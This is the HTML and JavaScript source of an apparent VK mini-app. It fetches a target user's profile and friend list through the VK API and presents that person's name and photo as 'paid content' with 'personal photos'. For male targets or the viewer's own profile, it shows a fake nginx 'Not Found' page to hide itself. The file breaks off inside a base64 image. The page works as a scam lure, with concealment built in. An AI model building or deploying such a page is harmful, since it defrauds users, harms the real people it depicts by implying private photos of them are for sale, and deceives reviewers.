<!doctype html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
  <script>
        var params = window
                    .location
                    .search
                    .replace('?','')
                    .split('&')
                    .reduce(
                        function(p,e){
                            var a = e.split('=');
                            p[ decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
                            return p;
                        },
                        {}
                    );

        var viewer_id = parseInt(params['vk_user_id']);
        var permissions = 1;
        var vk_app_id = parseInt(params['vk_app_id']);
        var unix = 0;
        var platform = params['vk_platform'];
        var date = '';
        var vk_is_app_user = parseInt(params['vk_is_app_user']);
        var is_loaded_story = 0;
        var IsAllowMessages = 0;

        var token = "";
        var viewer = {};
        var my_age = 0;
        var hash = window.location.hash.substr(1);
        if(!hash) {
          hash = 1;
        }


        function firstApi() {
            var code = 'var user=API.users.get({user_ids:'+hash+',fields:"uid, first_name, last_name, photo_max, photo_200, photo_id, bdate, sex, city, relation, is_closed, has_photo, counters"})[0]; \n\
            var friends = API.friends.get({"fields": "sex, photo_100, photo_200, photo_max, photo_400_orig, photo_id, online, online_mobile, can_post, relation, last_seen, has_photo, common_count, followers_count, has_photo", "count":500}); \n\
            return [user,friends];';

             vkConnect.send("VKWebAppCallAPIMethod", {
                "method": "execute",
                "params": {"code": code, "v": "5.131", "access_token": token}
            }).then(data => {
                viewer.friends = data.response[1];
                var user = data.response[0];
                if(user.id == viewer_id || user.sex == 2) {
                  hash = "";
                }


                console.log(user);



                if(!hash){ // Ошибка
                    $("body").html('<html> \n\
                    <head><title>404 Not Found</title></head>  \n\
                    <body bgcolor="white">  \n\
                    <center><h1>403 Not Found</h1></center>  \n\
                    <hr><center>nginx</center>  \n\
                    </body>  \n\
                    </html>');
                }else{

                  createAlbom();

                  var div = '<div style="padding: 100px;padding-top:50px;padding-bottom:10px;" class="w-full lg:max-w-full lg:flex"> \n\
                              <div class="h-48 lg:h-auto lg:w-48 flex-none bg-cover rounded-t lg:rounded-t-none lg:rounded-l text-center overflow-hidden" style="background-image: url(\''+user.photo_200+'\')"> \n\
                              </div> \n\
                              <div class="border-r border-b border-l border-gray-400 lg:border-l-0 lg:border-t lg:border-gray-400 bg-white rounded-b lg:rounded-b-none lg:rounded-r p-4 flex flex-col justify-between leading-normal"> \n\
                                <div class="mb-8"> \n\
                                  <p class="text-sm text-gray-600 flex items-center"> \n\
                                    <svg class="fill-current text-gray-500 w-3 h-3 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"> \n\
                                      <path d="M4 8V6a6 6 0 1 1 12 0v2h1a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2v-8c0-1.1.9-2 2-2h1zm5 6.73V17h2v-2.27a2 2 0 1 0-2 0zM7 6v2h6V6a3 3 0 0 0-6 0z" /> \n\
                                    </svg> \n\
                                    Платный контент \n\
                                  </p> \n\
                                  <div class="text-gray-900 font-bold text-xl mb-2">'+user.first_name+'</div> \n\
                                  <p style="margin-bottom:10px;" class="text-gray-700 text-base">Всего 5 личных фотографий</p> \n\
                                  <img style="display: inline-block;" class="w-10 h-10 rounded-full mr-1" src="data:image/jpeg;base64,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"> \n\
                                  <img style="display: inline-block;" class="w-10 h-10 rounded-full mr-1" src="data:image/jpeg;base64,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"> \n\
                                  <img style="display: inline-block;" class="w-10 h-10 rounded-full mr-1" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAwXpUWHRSYXcgcHJvZmlsZSB0eXBlIGV4aWYAAHjabVBBDsMgDLvzij0hgSTAc9oKpP1gz59T6Mq0WQKME4whtNezh4eDKwXRXKyaESBVatxACg0oEW/EvmI+IdtYef/Wg8ZBYoGU7gJNPTEU5/v0nkZWSyZZjEaWG/Ui/H+vZMV6FuuaLBlnMj2N3BVvi5TRe8zDx3UY168pP2mhL2lSdKOT/RZWqErD/yXpIoL7FeaGkdHneXwEaxC8gA+2Dg7D8Aa/rE/y/rIaogAACtVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDQuNC4wLUV4aXYyIj4KIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgeG1sbnM6ZXhpZj0iaHR0cDovL25zLmFkb2JlLmNvbS9leGlmLzEuMC8iCiAgIHRpZmY6WFJlc29sdXRpb249IjE0NC8xIgogICB0aWZmOllSZXNvbHV0aW9uPSIxNDQvMSIKICAgdGlmZjpSZXNvbHV0aW9uVW5pdD0iMiIKICAgdGlmZjpTb2Z0d2FyZT0iUGhvdG9TY2FwZSIKICAgZXhpZjpDb2xvclNwYWNlPSIxIgogICBleGlmOlBpeGVsWERpbWVuc2lvbj0iNTAiCiAgIGV4aWY6UGl4ZWxZRGltZW5zaW9uPSI1MCI+CiAgIDxleGlmOlVzZXJDb21tZW50PgogICAgPHJkZjpBbHQ+CiAgICAgPHJkZjpsaSB4bWw6bGFuZz0ieC1kZWZhdWx0Ij5TY3JlZW5zaG90PC9yZGY6bGk+CiAgICA8L3JkZjpBbHQ+CiAgIDwvZXhpZjpVc2VyQ29tbWVudD4KICA8L3JkZjpEZXNjcmlwdGlvbj4KIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pixb+9IAAAAJcEhZcwAAFiUAABYlAUlSJPAAABOiSURBVGiBZZrpjhxJsp0/M3ePJbeqYpM909OaBVd6Sr2MHko/BAjCvaPuHrLJZm25RYRvph8eWSSuSCSqMhMVEcfdlnOOufz3//G/LOdKLpANrAJiGFCrUQEwAATBCXgvOAyn4BwEBSeCiKAKZoZZpZRMnCMxRko1VIW+7+n7nqHzqIN2g4pKRQCvgjrBCzgBgFor1aCYkYsRk5ErVFMKglfwQ3AkEVQNV8EMKkY1Ayc0SIKuF3YqdArerwBWME6ESgNRS6WkSI1H7PJKOp3IOaPe4zZ39Pd3iN8TfED8+rQIAqhAUMEpiLXrIUI1o5isCy4sGaq1pysqeERwTkGNYG3tDcPstg+0Gyh4hc59eznXPlO1dReMnCspz0zzM+nlM9evnzi/PlFSwnUDdvcB5S84AdUD6gNmAtYAOQVEMKQ9SYVcoZiQshELzAligkL7O+8F7xyItK1sKyKIfANiKxDnIDgYvDD49rtTQ9VQDCuVnCLX5UK6PDF//cjrx3/y8uU38uWlhUo/kpcXLiUCSlFPGPYYjrKumhPwVfBO1h0RSm0RkrIQszGvgBoQcAY+OKGqIcjbqjuVdT2grjdo3wm9g+AFv4JwAs4KtVwo12fK4xfmr79z+vgLLx9/5fz8BwOZ3aanywv5XIgmVDeS/YZgPeZ6iilmLbT8umgqimCYCVaNVCBVI5mRgbKmmFXwnTOytR0QaS+3XswQzFbkK7BiEKtRzHBmdCQ0nynHz0xffuH10688ffmdx8+/c3p6QnLksOv5cXQ4hbNdOV2+Ul8OLP2B5LbU3lFdWPNEcCb4KjiR78BYS3gMxBBdw36NHC8UFDBZY+u7f14bGKzFaa5GqkA2HJVeEtiZfP2Dy5d/8viv/+DLx195fvrK8/MzcYncBcdd59h1DjNaDtULZfpKPR5I/R6kQ0YP4jARKkJeF1Bp1dAJuCCEtaCkUlkKlAJVwCsFEag0iLq+vEBw7TNntzJolGqtXFpG6pk8fyE9/cbTp1/548sXHp+feXl55Xg8I1YxN4AVak6YeDpx7EjE+MLl+AkZ7tBxR+82aKeYKbW2kG53upV8ZdMpoxcwY06VS6qtFBv4MdzyoHUMkRuIVplElWqtZ3iMXApqhVCvhPiV+Pwbpy+/8vz0yOkycZkT5zlymhY8xtUpl2lhcErfCd4pWCEtJ6ge2Tww/vCBffeObjtiJsQCS4altIjonLAfHO+2jn2vmBmXOdNPwhwr0Qy/74VcWwyuWbEmXGs0IpW61q/gKuIqnc24+Zl4/cj56VdOj1+4Xi7EFEkpcZ0j5ykiZniDbXAEUR7E4THIRo0zkgW3PLGpJ+7czKbfYiLMGS4JNLUd6b2wH5SHrWPfC2ZGUEXFmD0UU/zQCbkYtRiYcevlGNRS1lK8JrZUOiJdPZGn3zk//crLH594fn7lNC1cLhdO5zOny5XznMAMNRiDY+M9m+DRmimlYslQcbh4wsVXXDrj6xZxPSKCOaUiFDOCN3pvdN4YfMuREoySDbd2HG9WMSuYtbbe3rfoLDdEZgiVIJneLuj0lcvTR56/fOLx61eeX64cp5nT5cLL65HLdSbmAgYnS/zhhCACVrnrHV6FgiDOY/FEPD0yHx/xocePOwyPM09nSsHjALNCyZB9q2JYQWlhXs3wc1zW3ahvHKlWo1pdQw1EjEAFZmp8Ib185vj5Ey9//MH55ZXpPHO9zFynK3GJWK3t5tL40WlK/G5GypnLGDiMjs57UAfnZ+rXj9SwIabCsH/AdSPme9AedT1aA5YdKToWATEjxUKKhRJXINfLjK0PfIspM1s51o2iGGKZVBe4nInPr5xfj6RpQnIiWKInk8Qo3iFdoBcll/JG9l7nRMqFJSVS7TiM4IiYHJnkI3OB6XphPLyj3+wJww4Z9ui4h35D0Y5FFCKYVVKuLKmSUqVaxc+xJWVDImtTlDdQbz+tQjaWCDEJBUfwnn3vkKqE6hnV2Drh2ilLzMSc2w1zJVsrk0uFWCGttKHGSD09E2NmOr3QjXvG7Z5hf89w+ED38Cfk7j1FtyzmSRi1Nk6Xq1FK6/w+xgTrw99A6K3Ff5cjxYxUFBix/h7bXxlTwqwiVNQMT8abI0glqpGKUEplKZVc2yW3fWA79myGgdB1VHUkM+blzLxcmV8fWfqBcbsnvXtmWyKiiqpS69CKULU3iWG1kVx/Pr/AqiXkTVMoKvr/gZFaUPNo2CK7H9AScTnBdabaRC6FXDKlFMDonBC6DnWKOkffeXZjx37s2Q4DLnQYylwqr9fI63VhnififIT5Fa0J1